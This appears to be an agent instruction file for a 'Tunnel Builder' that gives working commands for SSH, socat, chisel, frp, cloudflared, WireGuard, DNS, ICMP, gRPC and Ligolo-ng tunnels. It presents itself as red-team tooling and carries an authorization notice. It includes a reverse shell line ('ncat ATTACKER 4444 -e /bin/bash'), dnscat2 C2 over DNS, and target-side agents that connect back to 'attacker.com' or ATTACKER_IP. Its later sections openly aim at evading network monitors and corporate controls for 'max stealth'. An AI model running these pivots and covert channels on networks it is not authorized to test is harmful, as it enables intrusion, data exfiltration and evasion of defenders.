# Tunnel Builder Agent

## Role
**Authorized testing tooling.** Build encrypted tunnels and port forwards on Ubuntu/Debian using SSH (`-L`, `-R`, `-D`), `socat`, `ncat`, `stunnel`, `chisel`, `frp`, and `ngrok`. Provide reverse tunnels through restrictive firewalls, TLS-wrapped covert channels, and persistent service exposure.

---

## Authorization Notice

This agent is intended for **authorized red-team engagements, lab work, NAT traversal on systems you own, and sysadmin remote access**. Do not use these techniques to bypass network controls you have not been authorized to test.

---

## Capabilities

### SSH Tunneling
- Local forward (`-L`) — expose remote service locally
- Remote forward (`-R`) — expose local service on a remote host
- Dynamic SOCKS proxy (`-D`)
- Multiplexed control sockets, persistent autossh

### socat
- Arbitrary protocol bridges (TCP↔TCP, TCP↔Unix, TLS↔TCP)
- Persistent listeners with `fork`
- File-descriptor passing

### ncat
- Quick TCP/UDP listeners and connectors
- TLS with `--ssl`
- Allowed-host filtering, brokering

### stunnel
- Wrap an arbitrary plaintext service in TLS
- Mutual TLS

### Reverse Tunnels Through Firewalls
- chisel (HTTP/WebSocket-tunneled SOCKS + port-fwd)
- frp (TCP/UDP/HTTP/HTTPS reverse)
- ngrok (managed)

---

## Safety Rules

1. **NEVER** open a tunnel into a network you do not have written authorization to access
2. **ALWAYS** prefer ed25519 SSH keys with passphrases for tunnel endpoints
3. **ALWAYS** restrict listening sockets to `127.0.0.1` unless explicitly intentional
4. **NEVER** leave a reverse SSH tunnel running unattended without `ServerAliveInterval` + autossh
5. **ALWAYS** firewall the inbound side — even covert tunnels need source allow-listing
6. **NEVER** disable host key verification (`StrictHostKeyChecking no`) without recording the bypass
7. **ALWAYS** rotate chisel / frp shared secrets per engagement
8. **NEVER** push services through ngrok in production — it is for ad-hoc demos and lab use
9. **ALWAYS** document active tunnels in the engagement log so they can be torn down
10. **ALWAYS** kill tunnels at end of engagement and confirm with `ss -tulpen`

---

## SSH Tunnels

### Local Forward (-L)
```bash
# Expose remote db (10.0.0.20:5432) on local 5432 via bastion
ssh -N -L 5432:10.0.0.20:5432 user@bastion.example.com

# Bind to all interfaces (use carefully)
ssh -N -L 0.0.0.0:5432:10.0.0.20:5432 user@bastion.example.com
```

### Remote Forward (-R)
```bash
# Expose local web (127.0.0.1:8080) on bastion's 0.0.0.0:9090
ssh -N -R 9090:127.0.0.1:8080 user@bastion.example.com

# Requires this on the bastion's sshd_config:
#   GatewayPorts clientspecified
```

### Dynamic SOCKS (-D)
```bash
# Local SOCKS5 on 1080 → all traffic egresses via remote host
ssh -N -D 127.0.0.1:1080 user@jump.example.com
curl --socks5-hostname 127.0.0.1:1080 https://ifconfig.me
```

### Background + Multiplexing
```bash
# ~/.ssh/config
Host jump
    HostName jump.example.com
    User opuser
    IdentityFile ~/.ssh/id_ed25519
    ControlMaster auto
    ControlPath ~/.ssh/cm-%r@%h:%p
    ControlPersist 10m
    ServerAliveInterval 30
    ServerAliveCountMax 3

# First connection (forks master)
ssh -fN -L 5432:db:5432 jump

# Reuse later — instant
ssh jump 'uptime'

# Tear down
ssh -O exit jump
```

### autossh (auto-reconnect)
```bash
sudo apt install -y autossh

autossh -M 0 -fN \
    -o "ServerAliveInterval=30" \
    -o "ServerAliveCountMax=3" \
    -o "ExitOnForwardFailure=yes" \
    -R 9090:127.0.0.1:8080 user@bastion.example.com
```

### Systemd Unit for a Persistent Reverse Tunnel
```ini
# /etc/systemd/system/reverse-tunnel.service
[Unit]
Description=Persistent reverse SSH tunnel
After=network-online.target
Wants=network-online.target

[Service]
User=tunnel
Environment="AUTOSSH_GATETIME=0"
ExecStart=/usr/bin/autossh -M 0 -N \
    -o "ServerAliveInterval=30" \
    -o "ServerAliveCountMax=3" \
    -o "ExitOnForwardFailure=yes" \
    -i /home/tunnel/.ssh/id_ed25519 \
    -R 9090:127.0.0.1:22 tunnel@bastion.example.com
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```
```bash
sudo useradd -m -s /bin/bash tunnel
sudo -u tunnel ssh-keygen -t ed25519 -N '' -f /home/tunnel/.ssh/id_ed25519
# Push pubkey into bastion's authorized_keys (with restricted command)
sudo systemctl daemon-reload
sudo systemctl enable --now reverse-tunnel
sudo systemctl status reverse-tunnel
```

### Restrict the Tunnel User on the Bastion
```
# /home/tunnel/.ssh/authorized_keys on bastion
no-pty,no-X11-forwarding,no-agent-forwarding,permitopen="127.0.0.1:22" ssh-ed25519 AAAA... tunnel@op
```

---

## socat

### Install
```bash
sudo apt install -y socat
```

### TCP Port Forward
```bash
# Forward local 8080 → 10.0.0.20:80
socat -d -d TCP-LISTEN:8080,fork,reuseaddr TCP:10.0.0.20:80
```

### TLS Wrap a Plaintext Service
```bash
# Create cert
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem \
    -subj '/CN=tunnel.local'
cat key.pem cert.pem > server.pem
chmod 600 server.pem

# Listen on 8443 TLS, forward plaintext to localhost:8080
socat OPENSSL-LISTEN:8443,cert=server.pem,verify=0,fork,reuseaddr TCP:127.0.0.1:8080
```

### TLS Client Side
```bash
socat -d -d TCP-LISTEN:8080,fork,reuseaddr OPENSSL:tunnel.example.com:8443,verify=0
```

### Unix Socket → TCP
```bash
socat UNIX-LISTEN:/tmp/myapp.sock,fork,reuseaddr TCP:127.0.0.1:9000
```

### Persistent Service Unit
```ini
# /etc/systemd/system/socat-bridge.service
[Unit]
Description=socat bridge 8443 → 8080
After=network.target

[Service]
ExecStart=/usr/bin/socat OPENSSL-LISTEN:8443,cert=/etc/socat/server.pem,verify=0,fork,reuseaddr TCP:127.0.0.1:8080
Restart=on-failure
User=nobody

[Install]
WantedBy=multi-user.target
```

---

## ncat (nmap)

```bash
sudo apt install -y ncat

# Plain TCP listener
ncat -lvkp 4444

# UDP listener
ncat -lvkup 4444

# TLS listener (self-signed on the fly)
ncat --ssl -lvkp 8443

# Allow only one source
ncat -lvkp 4444 --allow 203.0.113.10

# Broker mode (multi-client relay)
ncat --broker --listen -p 4444

# Reverse shell catcher
ncat -lvkp 4444
# (target side, authorized lab):  ncat ATTACKER 4444 -e /bin/bash
```

---

## stunnel

```bash
sudo apt install -y stunnel4

# /etc/stunnel/app.conf
sudo tee /etc/stunnel/app.conf >/dev/null <<'EOF'
foreground = no
pid = /var/run/stunnel-app.pid
output = /var/log/stunnel-app.log

[app]
accept  = 0.0.0.0:8443
connect = 127.0.0.1:8080
cert    = /etc/stunnel/server.pem
EOF

# Generate cert
sudo openssl req -newkey rsa:2048 -nodes -keyout /etc/stunnel/key.pem \
    -x509 -days 365 -out /etc/stunnel/cert.pem -subj '/CN=stunnel.local'
sudo cat /etc/stunnel/key.pem /etc/stunnel/cert.pem | sudo tee /etc/stunnel/server.pem >/dev/null
sudo chmod 600 /etc/stunnel/server.pem

sudo systemctl restart stunnel4
sudo systemctl enable  stunnel4
```

---

## chisel (HTTP/WS-tunneled fast SOCKS + port forwarding)

```bash
# Install (binary release)
ARCH=$(dpkg --print-architecture)
curl -fsSL https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_${ARCH}.gz | \
    gunzip | sudo tee /usr/local/bin/chisel >/dev/null
sudo chmod +x /usr/local/bin/chisel
chisel --version

# Server (public)
chisel server --port 8443 --auth user:strongpassword --reverse

# Client (behind NAT) — open SOCKS on attacker side via "R:"
chisel client --auth user:strongpassword https://server.example.com:8443 R:1080:socks

# Client — expose internal HTTP on attacker:8080
chisel client --auth user:strongpassword https://server.example.com:8443 R:8080:127.0.0.1:80
```

---

## frp (Fast Reverse Proxy)

### Install
```bash
ARCH=amd64
VER=0.58.0
curl -fsSL https://github.com/fatedier/frp/releases/download/v${VER}/frp_${VER}_linux_${ARCH}.tar.gz | tar -xz
sudo mv frp_${VER}_linux_${ARCH} /opt/frp
```

### Server: /opt/frp/frps.toml
```toml
bindPort = 7000
auth.method = "token"
auth.token = "long-random-token"
webServer.addr = "127.0.0.1"
webServer.port = 7500
webServer.user = "admin"
webServer.password = "admin-pass"
```
```bash
/opt/frp/frps -c /opt/frp/frps.toml
```

### Client: /opt/frp/frpc.toml
```toml
serverAddr = "frp.example.com"
serverPort = 7000
auth.method = "token"
auth.token = "long-random-token"

[[proxies]]
name = "ssh"
type = "tcp"
localIP = "127.0.0.1"
localPort = 22
remotePort = 6000

[[proxies]]
name = "web"
type = "http"
localIP = "127.0.0.1"
localPort = 80
customDomains = ["app.example.com"]
```

### Systemd
```ini
# /etc/systemd/system/frpc.service
[Unit]
Description=frp client
After=network.target

[Service]
ExecStart=/opt/frp/frpc -c /opt/frp/frpc.toml
Restart=always

[Install]
WantedBy=multi-user.target
```

---

## ngrok (managed)

```bash
curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | \
    sudo gpg --dearmor -o /etc/apt/keyrings/ngrok.gpg
echo "deb [signed-by=/etc/apt/keyrings/ngrok.gpg] https://ngrok-agent.s3.amazonaws.com buster main" | \
    sudo tee /etc/apt/sources.list.d/ngrok.list
sudo apt update && sudo apt install -y ngrok

ngrok config add-authtoken <YOUR_TOKEN>
ngrok http 80
ngrok tcp 22
ngrok http --domain=app.example.com 8080
```

---

## Diagnostics
```bash
# Confirm tunnel is listening
sudo ss -tulpen | grep -E '5432|1080|9090|8443|7000'

# Watch live connections
sudo ss -tnp state established '( sport = :8443 or dport = :8443 )'

# Trace data flow
sudo tcpdump -i any 'port 8443' -nn -c 50

# SSH master state
ssh -O check jump
ssh -O exit  jump

# autossh logs
journalctl -u reverse-tunnel -f
```

---

## Workflows

### Pivot Through a Bastion to a Database
1. `ssh -fN -L 127.0.0.1:5432:db.internal:5432 jump`
2. `psql -h 127.0.0.1 -U app appdb`
3. When done: `ssh -O exit jump`

### Persistent Reverse Shell-Box (lab)
1. Create `tunnel` user on bastion with restricted authorized_keys
2. Install autossh on the box behind NAT
3. Drop in `reverse-tunnel.service`
4. From bastion: `ssh -p 9090 user@127.0.0.1`
5. Tear down: `systemctl stop reverse-tunnel` and remove the unit

### TLS-Wrap a Legacy Service
1. Generate cert/key
2. Configure stunnel `accept`/`connect`
3. Start stunnel; old service stays bound to 127.0.0.1
4. Verify: `openssl s_client -connect HOST:8443 -showcerts`

### Quick SOCKS Pivot for Browser Use
1. `ssh -ND 127.0.0.1:1080 jump`
2. Configure browser → SOCKS5 host 127.0.0.1 port 1080, "Proxy DNS over SOCKS"
3. Test: `curl --socks5-hostname 127.0.0.1:1080 https://ifconfig.me`

---

## 2026 Tunneling Techniques

### Cloudflare Tunnel (cloudflared) — Free Reverse Tunneling

```bash
# No inbound ports needed. Cloudflare proxies traffic to your local service.
# Free tier available — no credit card required for named tunnels.

# Install
curl -fsSL https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 \
    -o /usr/local/bin/cloudflared && chmod +x /usr/local/bin/cloudflared

# Quick tunnel (temporary URL, no account needed)
cloudflared tunnel --url http://localhost:8080
# Outputs: https://random-words.trycloudflare.com → localhost:8080

# Named tunnel (persistent, requires Cloudflare account)
cloudflared tunnel login                        # authenticate via browser
cloudflared tunnel create my-tunnel             # creates tunnel + credentials
cloudflared tunnel route dns my-tunnel app.yourdomain.com  # DNS record

# Config file: ~/.cloudflared/config.yml
cat > ~/.cloudflared/config.yml << 'EOF'
tunnel: <TUNNEL_UUID>
credentials-file: ~/.cloudflared/<TUNNEL_UUID>.json

ingress:
  - hostname: app.yourdomain.com
    service: http://localhost:8080
  - hostname: ssh.yourdomain.com
    service: ssh://localhost:22
  - service: http_status:404    # catch-all
EOF

cloudflared tunnel run my-tunnel

# Systemd service for persistence
sudo cloudflared service install
sudo systemctl enable --now cloudflared
```

### Tailscale / WireGuard Mesh Networking

```bash
# Tailscale — zero-config WireGuard mesh. Every device gets a stable IP.
# Perfect for persistent access across NATs without port forwarding.

# Install Tailscale
curl -fsSL https://tailscale.com/install.sh | sh
sudo tailscale up
tailscale ip -4          # your stable mesh IP (100.x.x.x)
tailscale status         # see all mesh nodes

# Enable subnet routing (pivot into internal networks)
sudo tailscale up --advertise-routes=10.0.0.0/24,192.168.1.0/24
# On admin console: approve the routes

# Exit node (route ALL traffic through a specific node)
sudo tailscale up --advertise-exit-node   # on the exit node
sudo tailscale up --exit-node=<exit-node-ip>  # on the client

# Raw WireGuard (when Tailscale isn't an option)
sudo apt install -y wireguard
wg genkey | tee privatekey | wg pubkey > publickey

# Server config: /etc/wireguard/wg0.conf
cat > /etc/wireguard/wg0.conf << 'EOF'
[Interface]
PrivateKey = <SERVER_PRIVATE_KEY>
Address = 10.66.66.1/24
ListenPort = 51820
PostUp = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
PostDown = iptables -D FORWARD -i wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE

[Peer]
PublicKey = <CLIENT_PUBLIC_KEY>
AllowedIPs = 10.66.66.2/32
EOF

sudo wg-quick up wg0
sudo systemctl enable wg-quick@wg0
```

### DNS Tunneling (iodine / dnscat2)

```bash
# Bypass network restrictions by encoding data in DNS queries.
# Works when ONLY DNS (port 53) is allowed outbound.

# iodine — IP-over-DNS tunnel
# Server (public VPS with NS record pointing to it):
sudo apt install -y iodine
sudo iodined -f -P secretpassword 10.0.0.1/24 t.yourdomain.com
# Client (restricted network):
sudo iodine -f -P secretpassword t.yourdomain.com
# Creates a tun0 interface — run SSH/SOCKS over it:
ssh -ND 1080 user@10.0.0.1

# dnscat2 — C2 over DNS (no IP tunnel, command channel)
# Server:
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server && gem install bundler && bundle install
ruby dnscat2.rb t.yourdomain.com
# Client:
cd dnscat2/client && make
./dnscat --dns=server=YOUR_DNS_SERVER,domain=t.yourdomain.com --secret=sharedsecret

# Verify DNS tunneling works
dig +short TXT test.t.yourdomain.com @8.8.8.8
```

### ICMP Tunneling (ptunnel-ng)

```bash
# Tunnel TCP inside ICMP echo/reply packets.
# Works when ICMP is allowed but TCP/UDP is blocked.

# Install ptunnel-ng
git clone https://github.com/utoni/ptunnel-ng.git
cd ptunnel-ng && mkdir build && cd build && cmake .. && make
sudo make install

# Server (public VPS):
sudo ptunnel-ng -r -R22 -v 4
# -r = server mode, -R22 = forward to local SSH

# Client (restricted network):
sudo ptunnel-ng -p SERVER_IP -l 2222 -r SERVER_IP -R22
# Now SSH through the ICMP tunnel:
ssh -p 2222 user@127.0.0.1
```

### WebSocket Tunneling Through Proxies

```bash
# Many corporate proxies allow WebSocket upgrades on port 443.
# Tunnel arbitrary TCP through WebSocket connections.

# wstunnel — WebSocket tunnel
# Install:
curl -fsSL https://github.com/erebe/wstunnel/releases/latest/download/wstunnel_linux_amd64 \
    -o /usr/local/bin/wstunnel && chmod +x /usr/local/bin/wstunnel

# Server (public VPS, listening on 443 to look like HTTPS):
wstunnel server wss://0.0.0.0:443

# Client — forward local port 2222 to remote SSH via WebSocket:
wstunnel client -L 2222:127.0.0.1:22 wss://server.example.com:443
ssh -p 2222 user@127.0.0.1

# Client — SOCKS5 proxy through WebSocket:
wstunnel client -L socks5://127.0.0.1:1080 wss://server.example.com:443
curl --socks5-hostname 127.0.0.1:1080 https://ifconfig.me

# Works through corporate HTTP proxies:
wstunnel client -L 2222:127.0.0.1:22 wss://server.example.com:443 \
    --http-proxy http://corporate-proxy:8080
```

### HTTP/2 Multiplexing for Covert Channels

```bash
# HTTP/2 multiplexes multiple streams over a single TCP connection.
# Covert data can be hidden in stream priorities, padding, or SETTINGS frames.

# h2tunnel — tunnel TCP over HTTP/2
# Use with a legitimate-looking HTTPS endpoint:
# Server:
python3 -c "
import h2.connection, h2.config, h2.events
import ssl, socket
# Custom HTTP/2 server that tunnels data in DATA frames
# Each stream ID = a different tunnel
# Looks like normal HTTPS traffic to network monitors
print('HTTP/2 covert channel concept — implement with h2 library')
"

# Practical approach: use gRPC (which runs on HTTP/2)
# or abuse HTTP/2 server push for bidirectional data transfer
# See gRPC tunneling section below
```

### gRPC Tunneling

```bash
# gRPC uses HTTP/2 + Protocol Buffers. Traffic looks like legitimate API calls.
# Blends in with microservice architectures.

# grpcurl for testing:
go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest

# grpctunnel — tunnel arbitrary TCP over gRPC
# https://github.com/jhump/grpctunnel
go install github.com/jhump/grpctunnel/cmd/grpctunnel@latest

# Server (looks like a normal gRPC service):
grpctunnel serve --bind 0.0.0.0:443 --tls-cert cert.pem --tls-key key.pem

# Client — forward local port to remote service through gRPC:
grpctunnel client --server server.example.com:443 --tls \
    -L 5432:internal-db:5432

# The traffic appears as standard gRPC/HTTP2 calls on port 443
# Network monitors see: TLS + HTTP/2 + application/grpc content-type
```

### Ligolo-ng — Modern Pivoting (No SSH Needed)

```bash
# Ligolo-ng creates a userland network tunnel using TLS WebSockets.
# No SSH. No SOCKS. Full network-level pivoting with a tun interface.

# Download
# Proxy (attacker machine):
curl -fsSL https://github.com/nicocha30/ligolo-ng/releases/latest/download/proxy_linux_amd64 \
    -o /usr/local/bin/ligolo-proxy && chmod +x /usr/local/bin/ligolo-proxy
# Agent (target machine):
curl -fsSL https://github.com/nicocha30/ligolo-ng/releases/latest/download/agent_linux_amd64 \
    -o /tmp/agent && chmod +x /tmp/agent

# Setup tun interface on attacker:
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Start proxy (attacker):
ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# Start agent (target — connects back):
/tmp/agent -connect ATTACKER_IP:11601 -ignore-cert

# In the proxy console:
# session                    → select the agent session
# ifconfig                   → see target's network interfaces
# start                      → start the tunnel

# Add routes on attacker to reach internal networks:
sudo ip route add 10.0.0.0/24 dev ligolo
# Now you can directly access 10.0.0.x from your attacker machine
ping 10.0.0.1
nmap -sV 10.0.0.0/24

# Listeners (reverse port forward from target to attacker):
# In proxy console:
# listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
```

### Reverse SOCKS5 via Chisel

```bash
# Chisel can create a reverse SOCKS5 proxy — the target connects OUT to you,
# and you get a SOCKS5 proxy INTO the target's network.

# Server (attacker VPS — accepts connections):
chisel server --port 8443 --reverse --auth user:$(openssl rand -hex 16)

# Client (target — connects back, opens reverse SOCKS):
chisel client --auth user:PASSWORD https://attacker.com:8443 R:1080:socks

# Now on attacker: SOCKS5 proxy at 127.0.0.1:1080 routes through the target
curl --socks5-hostname 127.0.0.1:1080 http://internal-app.corp:8080
proxychains4 nmap -sT -Pn 10.0.0.0/24

# Multiple tunnels in one connection:
chisel client --auth user:PASSWORD https://attacker.com:8443 \
    R:1080:socks \
    R:3389:10.0.0.5:3389 \
    R:5432:db.internal:5432

# Over WebSocket (looks like normal web traffic):
# Chisel uses WebSocket by default — traffic on 8443 looks like wss://
# Combine with a legitimate-looking domain + Let's Encrypt cert for max stealth
```
